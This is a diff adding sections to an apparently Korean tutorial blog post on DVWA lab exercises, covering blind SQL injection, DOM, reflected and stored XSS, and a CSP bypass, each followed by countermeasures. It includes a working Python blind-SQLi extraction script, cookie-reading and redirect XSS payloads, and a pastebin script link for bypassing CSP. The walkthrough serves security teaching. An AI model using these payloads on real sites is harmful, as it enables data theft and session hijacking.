@@ -754,6 +754,158 @@ if( isset( $_REQUEST[ &#39;Submit&#39; ] ) ) &#123;
 <p>Blind 의미는 이전의 SQL Injection 단계처럼 화면 상에 결과를 보여주는 것이 아닌</p>
 <p>값이 존재하면 true/false 또는 존재합니다/존재하지 않습니다 등으로 처리하게 됩니다.</p>
 <p>그래서 사용자의 데이터를 이전 방법처럼 시도했을 때는 확인이 불가능합니다.</p>
+<blockquote>
+<p>예제</p>
+</blockquote>
+<pre><code class="sql">1&#39; or 1=2 order by &lt;num&gt;#</code></pre>
+<p>num에 위치한 자리에 컬럼의 개수를 1,2,3,4 등으로 넣어서 컬럼의 개수를 확인할 수 있습니다.</p>
+<p>만약 대입한 숫자가 컬럼 개수와 일치한다면 “User ID exists in the database.” 문구를 띄울 것입니다.</p>
+<p>이런 점을 이용해서 위에서 설명했듯이 값이 맞을 때랑 틀릴 때를 구분하여 값을 하나씩 맞추면서 인젝션을 시도하게 됩니다.</p>
+<pre><code class="py">#!/usr/bin/python3
+
+import requests
+from time import sleep
+
+url = &quot;http://ip:port/vulnerabilities/sqli_blind&quot;
+
+session = &#123;&quot;PHPSESSID&quot;:&quot;key&quot;,&quot;security&quot;:&quot;low&quot;&#125;
+
+length = 0
+password = &quot;&quot;
+
+for i in range(1, 30):
+    param = &#123;&quot;id&quot;:&quot;1&#39; and length(database())=&quot;+str(i)+&quot;#&quot;, &quot;Submit&quot;:&quot;Submit#&quot;&#125;
+    r = requests.get(url, params=param, cookies=session)
+
+    if(&quot;User ID exists in the database.&quot; in r.text):
+        length = i
+        print(length)
+        break
+    else:
+        print(param)
+
+for i in range(1, length+1):
+    for j in range(32, 128):
+        param = &#123;&quot;id&quot;:&quot;1&#39; and substr(database(),&quot; +str(i)+ &quot;, 1)=&quot;&quot;&#39;&quot;+chr(j)+&quot;&#39;&quot;+&#39;#&#39;, &quot;Submit&quot;:&quot;Submit#&quot;&#125;
+        r = requests.get(url, params=param, cookies=session)
+
+        if(&quot;User ID exists&quot; in r.text):
+            password += chr(j)
+            print(password)
+        else:
+            print(param)</code></pre>
+<p>위와 같이 여러 함수들을 사용해서 응용 할 수 있는 것이죠.</p>
+<p>Blind Injection 에서 사용하는 함수들은 <code> substr, hex, ord, ascii, length, left, right </code> 등 여러 많은 함수가 있습니다.</p>
+<p>추후 포스팅 될 여러 DB 엔진에서 발생하는 SQL 인젝션에 대해서 좀 더 알아보도록 합시다.</p>
+<hr>
+<h3 id="SQL-Injection-Blind-대응-방안"><a href="#SQL-Injection-Blind-대응-방안" class="headerlink" title="SQL Injection(Blind) 대응 방안"></a>SQL Injection(Blind) 대응 방안</h3><ol>
+<li><p>입력 값에 따른 결과를 공격자가 추측할 수 없도록 설정 (true/false)</p>
+</li>
+<li><p>PDO 방식 코딩 권장</p>
+</li>
+</ol>
+<p>대응 방안은 그냥 SQL 인젝션이랑 유사하다고 보시면 됩니다! 다만, true/false 결과가 나오는 정도는 막아주셔야 하겠지요.</p>
+<hr>
+<h3 id="DOM-Based-XSS"><a href="#DOM-Based-XSS" class="headerlink" title="DOM Based XSS"></a>DOM Based XSS</h3><p>이번에 볼 내용은 XSS(Cross Site Scripting) 공격 기법 중 DOM 방식에 대해서 알아보겠습니다.</p>
+<p>DOM 방식은 XML이나 HTML 문서에 접근하기 위한 일종의 인터페이스라고 보시면 됩니다.</p>
+<pre><code class="js">if (document.location.href.indexOf(&quot;default=&quot;) &gt;= 0) &#123;
+    var lang = document.location.href.substring(document.location.href.indexOf(&quot;default=&quot;)+8);
+    document.write(&quot;&lt;option value=&#39;&quot; + lang + &quot;&#39;&gt;&quot; + decodeURI(lang) + &quot;&lt;/option&gt;&quot;);
+    document.write(&quot;&lt;option value=&#39;&#39; disabled=&#39;disabled&#39;&gt;----&lt;/option&gt;&quot;);
+&#125;
+
+document.write(&quot;&lt;option value=&#39;English&#39;&gt;English&lt;/option&gt;&quot;);
+document.write(&quot;&lt;option value=&#39;French&#39;&gt;French&lt;/option&gt;&quot;);
+document.write(&quot;&lt;option value=&#39;Spanish&#39;&gt;Spanish&lt;/option&gt;&quot;);
+document.write(&quot;&lt;option value=&#39;German&#39;&gt;German&lt;/option&gt;&quot;);</code></pre>
+<p>우선 해당 페이지의 소스 코드를 보면 DOM 객체로 페이지를 처리하고 있음을 알 수 있습니다.</p>
+<p>URL을 보면 <code> vulnerabilities/xss_d?default=내용 </code> 과 같이 처리되는 것이죠.</p>
+<p>DOM XSS라고 해서 일반적인 XSS와 크게 다르지는 않습니다.</p>
+<p>default 변수 뒤 값이 들어갈 때의 부분을 조작하여 공격자의 URL이나 스크립트를 실행시킬 수 있게됩니다.</p>
+<img src="/img/post/dvwa/domxss.png" class="lazyload" data-srcset="/img/post/dvwa/domxss.png" srcset="data:image/png;base64,666">
+
+<p><code> vulnerabilities/xss_d?default=<script>alert(document.cookie)</script> </code></p>
+<h3 id="DOM-Based-XSS-대응-방안"><a href="#DOM-Based-XSS-대응-방안" class="headerlink" title="DOM Based XSS (대응 방안)"></a>DOM Based XSS (대응 방안)</h3><ol>
+<li><p>특수문자 필터링 또는 치환</p>
+</li>
+<li><p>정규식 표현을 통한 입력값 제한</p>
+</li>
+<li><p>HTML 태그 입력 제한</p>
+</li>
+</ol>
+<hr>
+<h3 id="Reflect-XSS"><a href="#Reflect-XSS" class="headerlink" title="Reflect XSS"></a>Reflect XSS</h3><p>Reflect XSS 공격 기법은 반사형 XSS라고 부르며, 공격 과정은 다음과 같습니다.</p>
+<img src="/img/post/dvwa/reflexted-xss.png" class="lazyload" data-srcset="/img/post/dvwa/reflexted-xss.png" srcset="data:image/png;base64,666">
+
+<ol>
+<li><p>공격자가 악성 스크립트가 포함된 URL을 사용자에게 노출시킵니다.</p>
+</li>
+<li><p>사용자가 브라우저 내 해당 링크를 클릭했을 때 공격자가 정의한 악성 스크립트가 실행됩니다.</p>
+</li>
+<li><p>해당 악성 스크립트는 브라우저 내 비밀 정보(세션, 쿠키, 토큰값 등)를 공격자에게 전달하게 됩니다.</p>
+</li>
+</ol>
+<p>이런 과정을 통해서 세션 탈취 등의 행위를 수행할 수 있게됩니다.</p>
+<img src="/img/post/dvwa/reflectxss.png" class="lazyload" data-srcset="/img/post/dvwa/reflectxss.png" srcset="data:image/png;base64,666">
+
+<p>페이지를 보면 DOM Based 기법을 볼 때랑 크게 다르지 않습니다.</p>
+<p>사용자로부터 입력값을 받아서 브라우저에 출력시켜주고 있는데, name이라는 변수를 사용합니다.</p>
+<p>이 때, name 변수에 script 호출을 시켜준다면 실행이 될 것입니다.</p>
+<p><code> ?name=<script>location.href='<a target="_blank" rel="noopener" href="https://www.naver.com&/#39;">https://www.naver.com&#39;</a>;</script> </code></p>
+<p>해당 코드르 입력값으로 넣어주면 네이버로 페이지가 이동하게 되죠. 이런 점을 이용하여 공격자의 URL로 리다이렉트 시켜서</p>
+<p>악성 스크립트를 실행하거나 파일을 내려받는 등의 침투 시나리오까지 생각해볼 수 있습니다.</p>
+<hr>
+<h3 id="Reflect-XSS-대응-방안"><a href="#Reflect-XSS-대응-방안" class="headerlink" title="Reflect XSS (대응 방안)"></a>Reflect XSS (대응 방안)</h3><ol>
+<li>HTML 입력값 필터링(php 기준, htmlspecialchars 등의 함수를 사용)</li>
+</ol>
+<hr>
+<h3 id="Stored-XSS"><a href="#Stored-XSS" class="headerlink" title="Stored XSS"></a>Stored XSS</h3><img src="/img/post/dvwa/storedxss.png" class="lazyload" data-srcset="/img/post/dvwa/storedxss.png" srcset="data:image/png;base64,666">
+
+<p>XSS 기법중 Stored XSS는 웹 사이트 게시판 등에 스크립트를 작성하는 방식의 공격입니다.</p>
+<p>다른 사용자가 본인의 게시글을 읽을 수 있는 곳에 script 태그를 호출하게 만들면,</p>
+<p>본인의 게시글을 읽을 때 스크립트가 실행되게 되는 것입니다.</p>
+<p>공격 방법은 이전과 동일한 방식으로 갈 수 있기 때문에 생략하겠습니다 ^^.</p>
+<hr>
+<h3 id="CSP-Bypass"><a href="#CSP-Bypass" class="headerlink" title="CSP Bypass"></a>CSP Bypass</h3><p>CSP는 Content Security Policy의 약어로 브라우저 콘텐츠 보호 정책입니다.</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://developers.google.com/web/fundamentals/security/csp?hl=ko">https://developers.google.com/web/fundamentals/security/csp?hl=ko</a></li>
+</ul>
+<p>사이트 내 CSP를 설정하게 되면 허용한 태그 또는 도메인이 아닐 경우 모든 인라인 스크립트 실행을 차단하는 보호 기법이죠.</p>
+<p>만약, CSP를 잘못 설정하거나 올바르지 않은 방법으로 사용했을 때는 XSS 공격 같은 유형이 실행되겠죠?</p>
+<pre><code class="php">&lt;?php
+
+$headerCSP = &quot;Content-Security-Policy: script-src &#39;self&#39; https://pastebin.com hastebin.com example.com code.jquery.com https://ssl.google-analytics.com ;&quot;; // allows js from self, pastebin.com, hastebin.com, jquery and google analytics.
+
+header($headerCSP);
+
+# These might work if you can&#39;t create your own for some reason
+# https://pastebin.com/raw/R570EE00
+# https://hastebin.com/raw/ohulaquzex
+
+?&gt;
+&lt;?php
+if (isset ($_POST[&#39;include&#39;])) &#123;
+$page[ &#39;body&#39; ] .= &quot;
+    &lt;script src=&#39;&quot; . $_POST[&#39;include&#39;] . &quot;&#39;&gt;&lt;/script&gt;
+&quot;;
+&#125;
+$page[ &#39;body&#39; ] .= &#39;
+&lt;form name=&quot;csp&quot; method=&quot;POST&quot;&gt;
+    &lt;p&gt;You can include scripts from external sources, examine the Content Security Policy and enter a URL to include here:&lt;/p&gt;
+    &lt;input size=&quot;50&quot; type=&quot;text&quot; name=&quot;include&quot; value=&quot;&quot; id=&quot;include&quot; /&gt;
+    &lt;input type=&quot;submit&quot; value=&quot;Include&quot; /&gt;
+&lt;/form&gt;
+&#39;;</code></pre>
+<p>코드를 분석해보면 아래 부분에 CSP가 있음을 확인할 수 있습니다.</p>
+<pre><code class="php">$headerCSP = &quot;Content-Security-Policy: script-src &#39;self&#39; https://pastebin.com hastebin.com example.com code.jquery.com https://ssl.google-analytics.com ;&quot;; // allows js from </code></pre>
+<p>우선, script-src의 출처로 pastebin, hastebin, example, code.jquery, ssl-google~~ 등을 허용하고 있습니다.</p>
+<p>해당 도메인으로 오는 스크립트 요청은 허용하겠다는 의미이죠.</p>
+<p>그런데 pastebin을 허용해뒀네요, pastebin은 클립보드 같은 개념의 공유 서비스인데 여기에 스크립트 태그를 호출시키도록 작성하고</p>
+<p>페이지에 로드시키면 스크립트가 실행될 것입니다.</p>
+<p><a target="_blank" rel="noopener" href="https://pastebin.com/raw/WB8N2xSY">https://pastebin.com/raw/WB8N2xSY</a></p>
+<h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><ul>
+<li><a target="_blank" rel="noopener" href="https://www.imperva.com/learn/application-security/cross-site-scripting-xss-attacks/">https://www.imperva.com/learn/application-security/cross-site-scripting-xss-attacks/</a></li>
+</ul>
 
   
   
@@ -767,7 +919,7 @@ if( isset( $_REQUEST[ &#39;Submit&#39; ] ) ) &#123;
       <i class="fas fa-bookmark fa-fw" aria-hidden="true"></i><span>Related Posts</span>
     </section>
     <section class='body'>
-      <div class="vlts-rps"><a class="item" href="/2020/04/22/jwtinjection-200422/" title="JWT None Type Injection" rel="bookmark "><img src="/img/header/cat.jpeg" class="lazyload" data-srcset="/img/header/cat.jpeg" srcset="data:image/png;base64,666" /><span class="title">JWT None Type Injection</span></a></div></section></div>
+      <div class="vlts-rps"><a class="item" href="/2020/05/15/function-rce-200515/" title="create_function() RCE 취약점 정리" rel="bookmark "><img src="/img/header/cat.jpeg" class="lazyload" data-srcset="/img/header/cat.jpeg" srcset="data:image/png;base64,666" /><span class="title">create_function() RCE 취약점 정리</span></a></div></section></div>
       
       
       
@@ -865,7 +1017,7 @@ if( isset( $_REQUEST[ &#39;Submit&#39; ] ) ) &#123;
 
 
     <div class='content'>
-        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Intro"><span class="toc-number">1.</span> <span class="toc-text">Intro</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Brute-Force"><span class="toc-number">2.</span> <span class="toc-text">Brute Force</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Brute-Force-%EB%8C%80%EC%9D%91-%EB%B0%A9%EC%95%88"><span class="toc-number">3.</span> <span class="toc-text">Brute Force (대응 방안)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Command-Injection"><span class="toc-number">4.</span> <span class="toc-text">Command Injection</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Command-Injection-%EB%8C%80%EC%9D%91-%EB%B0%A9%EC%95%88"><span class="toc-number">5.</span> <span class="toc-text">Command Injection(대응 방안)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CSRF"><span class="toc-number">6.</span> <span class="toc-text">CSRF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CSRF-%EB%8C%80%EC%9D%91-%EB%B0%A9%EC%95%88"><span class="toc-number">7.</span> <span class="toc-text">CSRF (대응 방안)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#File-Inclusion"><span class="toc-number">8.</span> <span class="toc-text">File Inclusion</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#File-Inclusion-%EB%8C%80%EC%9D%91-%EB%B0%A9%EC%95%88"><span class="toc-number">9.</span> <span class="toc-text">File Inclusion(대응 방안)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#File-Upload"><span class="toc-number">10.</span> <span class="toc-text">File Upload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#File-Upload-%EB%8C%80%EC%9D%91-%EB%B0%A9%EC%95%88"><span class="toc-number">11.</span> <span class="toc-text">File Upload (대응 방안)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL-Injection"><span class="toc-number">12.</span> <span class="toc-text">SQL Injection</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL-Injection-%EB%8C%80%EC%9D%91-%EB%B0%A9%EC%95%88"><span class="toc-number">13.</span> <span class="toc-text">SQL Injection 대응 방안</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL-Injection-Blind"><span class="toc-number">14.</span> <span class="toc-text">SQL Injection(Blind)</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Intro"><span class="toc-number">1.</span> <span class="toc-text">Intro</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Brute-Force"><span class="toc-number">2.</span> <span class="toc-text">Brute Force</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Brute-Force-%EB%8C%80%EC%9D%91-%EB%B0%A9%EC%95%88"><span class="toc-number">3.</span> <span class="toc-text">Brute Force (대응 방안)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Command-Injection"><span class="toc-number">4.</span> <span class="toc-text">Command Injection</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Command-Injection-%EB%8C%80%EC%9D%91-%EB%B0%A9%EC%95%88"><span class="toc-number">5.</span> <span class="toc-text">Command Injection(대응 방안)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CSRF"><span class="toc-number">6.</span> <span class="toc-text">CSRF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CSRF-%EB%8C%80%EC%9D%91-%EB%B0%A9%EC%95%88"><span class="toc-number">7.</span> <span class="toc-text">CSRF (대응 방안)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#File-Inclusion"><span class="toc-number">8.</span> <span class="toc-text">File Inclusion</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#File-Inclusion-%EB%8C%80%EC%9D%91-%EB%B0%A9%EC%95%88"><span class="toc-number">9.</span> <span class="toc-text">File Inclusion(대응 방안)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#File-Upload"><span class="toc-number">10.</span> <span class="toc-text">File Upload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#File-Upload-%EB%8C%80%EC%9D%91-%EB%B0%A9%EC%95%88"><span class="toc-number">11.</span> <span class="toc-text">File Upload (대응 방안)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL-Injection"><span class="toc-number">12.</span> <span class="toc-text">SQL Injection</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL-Injection-%EB%8C%80%EC%9D%91-%EB%B0%A9%EC%95%88"><span class="toc-number">13.</span> <span class="toc-text">SQL Injection 대응 방안</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL-Injection-Blind"><span class="toc-number">14.</span> <span class="toc-text">SQL Injection(Blind)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL-Injection-Blind-%EB%8C%80%EC%9D%91-%EB%B0%A9%EC%95%88"><span class="toc-number">15.</span> <span class="toc-text">SQL Injection(Blind) 대응 방안</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DOM-Based-XSS"><span class="toc-number">16.</span> <span class="toc-text">DOM Based XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DOM-Based-XSS-%EB%8C%80%EC%9D%91-%EB%B0%A9%EC%95%88"><span class="toc-number">17.</span> <span class="toc-text">DOM Based XSS (대응 방안)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Reflect-XSS"><span class="toc-number">18.</span> <span class="toc-text">Reflect XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Reflect-XSS-%EB%8C%80%EC%9D%91-%EB%B0%A9%EC%95%88"><span class="toc-number">19.</span> <span class="toc-text">Reflect XSS (대응 방안)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Stored-XSS"><span class="toc-number">20.</span> <span class="toc-text">Stored XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CSP-Bypass"><span class="toc-number">21.</span> <span class="toc-text">CSP Bypass</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#References"><span class="toc-number">22.</span> <span class="toc-text">References</span></a></li></ol>
     </div>
   </section>
 
